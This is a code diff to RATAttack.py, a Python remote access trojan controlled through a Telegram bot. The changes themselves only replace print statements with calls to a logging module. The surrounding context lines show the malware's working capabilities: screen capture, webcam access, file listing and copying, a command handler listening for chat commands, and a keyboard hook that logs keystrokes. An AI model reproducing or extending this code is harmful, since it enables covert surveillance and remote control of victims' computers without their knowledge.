@@ -3,7 +3,7 @@
 import os, os.path, platform, ctypes
 os.environ["PBR_VERSION"]='5.0.0'
 import logging
-from consoleTools.consoleDisplay import log
+from consoleTools import consoleDisplay as cd
 from PIL import ImageGrab 								# /capture_pc
 from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
 from sys import argv, path, stdout 						# console output
@@ -34,6 +34,7 @@ import urllib# wallpaper
 import cv2#webcam
 from ctypes import * #fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145
 
+cd.log('i','Starting',True)
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 token = 'xx:xx' # you can set your environment variable as well
@@ -171,7 +172,7 @@ def split_string(n, st):
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
-			print(bot.sendMessage(chat_id, message))
+			cd.log('n','Message sent:\n{}'.format(bot.sendMessage(chat_id, message)))
 			break
 		except:
 			pass
@@ -181,7 +182,7 @@ def handle(msg):
         if checkchat_id(chat_id):
                 response = ''
                 if 'text' in msg:
-                        print('\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n')
+                        cd.log('n','\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n')
                         command = msg['text']
                         if command == '/arp':
                                 response = ''
@@ -618,14 +619,16 @@ def handle(msg):
                         responses = split_string(4096, response)
                         for resp in responses:
                                 send_safe_message(bot, chat_id, resp)#
-if token == 'xx:xx': raise Exception('Token not set')
+if token == 'xx:xx': cd.log('e','Token has not been set, open up RATAttack.py and change the token - then recompile (if applicable).',True); raise Exception('Token not set')
+cd.log('s','Setup done',True)
+cd.log('i','Starting',True)
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
 	for known_id in known_ids: send_safe_message(bot, known_id, helloWorld)
 	print(helloWorld)
-print('Listening for commands on ' + platform.uname()[1] + '...')
+cd.log('i','Listening for commands on ' + platform.uname()[1] + '...',True)
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
 hookManager.HookKeyboard()
